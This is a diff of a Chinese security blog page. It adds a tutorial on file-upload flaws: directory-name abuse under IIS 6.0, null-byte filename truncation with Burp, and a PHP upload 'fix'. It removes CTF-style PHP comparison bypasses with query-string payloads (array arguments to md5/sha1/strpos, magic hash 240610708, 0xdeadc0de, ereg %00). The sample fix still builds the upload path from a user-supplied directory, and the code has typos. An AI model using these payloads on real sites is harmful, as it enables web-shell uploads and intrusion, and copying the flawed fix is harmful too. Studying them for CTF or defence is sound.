+<pre><code class="html">&lt;input type=&quot;hidden&quot; name=&quot;Extension&quot; value=&quot;up&quot; /&gt;
+</code></pre>
+<p>这是文件上传默认的文件夹，而我们可以更改此参数: 使用FireBug将Value值改为pentest.asp，并提交上传一句话图片木马文件</p>
+<p>程序在接受文件后，对目录判断，如果服务器不存在pentest.asp目录，如果Web容器为IIS6.0，那么网页木马被解析</p>
+<h4 id="截断上传攻击"><a href="#截断上传攻击" class="headerlink" title="截断上传攻击"></a>截断上传攻击</h4><p>截断上传攻击在ASP程序中最常见，下列是一段简单的ASP代码:</p>
+<pre><code>&lt;%
+    username=request(&quot;username&quot;)
+    Response.wrtie username
+%&gt;
+</code></pre><p>这两句代码非常简单，接收username值，输出</p>
+<p>访问 url:<a href="http://www.xxser.com:801/test.asp?username=xxser%00admin" target="_blank" rel="noopener">http://www.xxser.com:801/test.asp?username=xxser%00admin</a> </p>
+<p>结果只输出”xxser”，%00将后面的字符都截断了</p>
+<p>可以使用Burp拦截请求</p>
+<p>将文件上传名称改为”1.asp(空格)xxser.jpg”，单机hex选项卡进入十六进制编辑模式，将文件名中空格的十六进制20改为00.单机GO，可以发现最终的文件为1.asp，后面的字符已经被截断</p>
+<h3 id="修复上传漏洞"><a href="#修复上传漏洞" class="headerlink" title="修复上传漏洞"></a>修复上传漏洞</h3><p>上传漏洞最终的形成原因有以下两点:</p>
+<ol>
+<li>目录过滤不严，攻击者可以建立畸形目录</li>
+<li>文件未重命名，攻击者可能利用Web容器解析漏洞</li>
+</ol>
+<p>如果把握这两点风险就会大大降低</p>
+<pre><code class="php">&lt;?php
+    if(!isset($_POST[&#39;submit&#39;])) {
+        exit();
+    }
+    $arr=Array(&#39;jpg&#39;,&#39;gif&#39;,&#39;jpeg&#39;,&#39;png&#39;,&#39;rar&#39;,&#39;zip&#39;,&#39;doc&#39;,&#39;docx&#39;);    //白名单
+    $imageTempName=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];                       //接收临时文件路径
+    $imageName=$_FILES[&#39;file&#39;][&#39;name&#39;];                               //接收文件名称
+    $last=strtolower(substr($imageName,strrpos($imageName,&quot;.&quot;)+1));   //取得扩展名，转换为小写
+    if(!in_array($last,$arr)) {
+        exit(&quot;不支持上传的扩展名.$last&quot;);
+    }
+    $Extension=$_POST[&#39;Extension&#39;];                                   //获得文件上传目录
+    $imageName=md5($imageName).&quot;.&quot;.$last;                             //对文件重命名
+    move_upload_file($imageTempName,&quot;./$Extension/&quot;.$imageName);
+    echo(&quot;文件上传成功 path=/$Extension/$imageName&quot;);
 ?&gt;
 </code></pre>
-<p>md5()函数无法处理数组类型，md5(数组)会返回NULL，所以可以用数组绕过(注意这里是”===”)</p>
-<p>payload：?username[]=1&amp;password[]=2</p>
-<h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><pre><code class="php">&lt;?php
-$flag = &quot;flag&quot;;
-
-if (isset ($_GET[&#39;password&#39;])) {
-if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
-echo &#39;You password must be alphanumeric&#39;;
-else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !== FALSE)          //strpos() 函数查找字符串在另一字符串中第一次出现的位置
-die(&#39;Flag: &#39; . $flag);
-else
-echo &#39;Invalid password&#39;;
-}
-?&gt;
-</code></pre>
-<p>ereg()正则限制了password判断，可以使用%00截断，构造数组返回NULL</p>
-<p>strpos()处理数组返回NULL</p>
-<p>payload：?password[]=1</p>
-<h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><pre><code class="php">&lt;?php
-$flag = &quot;flag&quot;;
-if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))
-{
-var_dump($_GET[&#39;name&#39;]);
-echo &quot;
-&quot;;
-var_dump($_GET[&#39;password&#39;]);
-var_dump(sha1($_GET[&#39;name&#39;]));
-var_dump(sha1($_GET[&#39;password&#39;]));
-if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])
-echo &#39;
-
-Your password can not be your name!
-
-&#39;;
-else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))
-die(&#39;Flag: &#39;.$flag);
-else
-echo &#39;
-Invalid password.
-
-&#39;;
-}
-else
-echo &#39;
-Login first!
-
-&#39;;
-?&gt;
-</code></pre>
-<p>同样sha1()无法处理数组</p>
-<p>payload：?name[]=1&amp;password[]=2</p>
-<h2 id="md5-加密相等绕过"><a href="#md5-加密相等绕过" class="headerlink" title="md5()加密相等绕过"></a>md5()加密相等绕过</h2><pre><code class="php">&lt;?php
-$md51 = md5(&#39;QNKCDZO&#39;);
-$a = @$_GET[&#39;a&#39;];
-$md52 = @md5($a);
-if(isset($a)){
-if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) {
-echo &quot;flag{*}&quot;;
-} else {
-echo &quot;false!!!&quot;;
-}}
-else{echo &quot;please input a&quot;;}
-?&gt;
-</code></pre>
-<p>这一题是”==”</p>
-<p>所以可以让a=240610708即可</p>
-<p>payload：?a=240610708</p>
-<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><pre><code class="php">&lt;?php
-error_reporting(0);
-function noother_says_correct($temp)
-{
-$flag = &#39;flag{test}&#39;;
-$one = ord(&#39;1&#39;); //ord — 返回字符的 ASCII 码值
-$nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值
-$number = &#39;3735929054&#39;;
-// Check all the input characters!
-for ($i = 0; $i &lt; strlen($number); $i++)
-{
-// Disallow all the digits!
-$digit = ord($temp{$i});
-if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
-{
-// Aha, digit not allowed!
-return &quot;flase&quot;;
-}
-}
-if($number == $temp)
-return $flag;
-}
-$temp = $_GET[&#39;password&#39;];
-echo noother_says_correct($temp);
-?&gt;
-</code></pre>
-<p>直接讲number的值改为十六进制就可以</p>
-<p>payload：?password=0xdeadc0de</p>
-<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><pre><code class="php">&lt;?php
-$flag = &quot;xxx&quot;;
-if (isset ($_GET[&#39;password&#39;]))
-{
-if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
-{
-echo &#39;
-
-You password must be alphanumeric
-
-&#39;;
-}
-else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)
-{
-if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !== FALSE) //strpos — 查找字符串首次出现的位置
-{
-die(&#39;Flag: &#39; . $flag);
-}
-else
-{
-echo(&#39;
-- have not been found
-
-&#39;);
-}
-}
-else
-{
-echo &#39;
-Invalid password
-
-&#39;;
-}
-}
-?&gt;
-</code></pre>
-<p>同样ereg()用%00阶段</p>
-<p>payload：?password=1e9%00<em>-</em></p>
-<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><pre><code class="php">&lt;?php
-$flag = &quot;flag&quot;;
-if (isset ($_GET[&#39;ctf&#39;])) {
-if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) === FALSE)
-echo &#39;必须输入数字才行&#39;;
-else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)
-die(&#39;Flag: &#39;.$flag);
-else
-echo &#39;骚年，继续努力吧啊~&#39;;
-}
-?&gt;
-</code></pre>
-<p>同样的题型</p>
-<p>payload：?ctf[]=1</p>
+<p>上述代码基本可以解决上传漏洞，但不能完全防御。比如Web容器为Apache，并不能识别RAR格式，那么就可以上传”正常文件”，配合Apache解析漏洞入侵</p>
 
         
     
@@ -734,21 +750,13 @@ echo &#39;骚年，继续努力吧啊~&#39;;
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/05/28/7/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            Newer
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/05/25/5/" id="post_nav-older" class="next-content">
+        <a href="/2018/05/29/9/" id="post_nav-older" class="next-content">
             Older
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
